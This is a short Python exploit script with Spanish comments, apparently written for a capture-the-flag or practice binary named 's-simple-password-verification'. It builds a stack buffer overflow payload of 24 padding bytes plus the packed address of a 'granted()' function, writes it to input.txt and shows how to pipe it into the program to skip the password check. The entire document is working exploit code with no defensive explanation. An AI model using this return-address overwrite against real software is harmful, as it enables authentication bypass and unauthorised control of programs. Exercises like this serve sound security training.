import struct

# Dirección de la función granted()
granted_address = 0x401166

# Relleno hasta sobreescribir el rbp
padding = b"A" * 24

# Convertimos la dirección a formato little-endian
payload = padding + struct.pack("<Q", granted_address)

# Ejecutamos el programa y enviamos el payload
print("[+] Enviando exploit...")
with open("input.txt", "wb") as f:
    f.write(payload)

print("[+] Exploit guardado en input.txt, ejecuta:")
print("    cat input.txt | ./s-simple-password-verification")

